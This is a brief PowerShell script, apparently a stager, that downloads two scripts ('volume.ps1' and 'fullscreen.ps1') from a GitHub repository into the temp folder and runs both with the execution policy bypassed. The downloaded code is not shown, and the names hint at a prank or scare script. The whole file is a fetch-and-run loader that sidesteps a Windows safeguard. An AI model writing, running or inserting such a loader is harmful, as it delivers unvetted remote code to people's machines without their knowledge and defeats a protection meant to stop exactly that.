$scriptPath = $env:TEMP
Invoke-WebRequest "https://github.com/halololcloud/images/raw/refs/heads/main/volume.ps1" -OutFile "$scriptPath\volume.ps1"
Invoke-WebRequest "https://github.com/halololcloud/images/raw/refs/heads/main/fullscrean.ps1" -OutFile "$scriptPath\fullscreen.ps1"

powershell.exe -ExecutionPolicy Bypass -File "$scriptPath\volume.ps1"
powershell.exe -ExecutionPolicy Bypass -STA -File "$scriptPath\fullscreen.ps1"
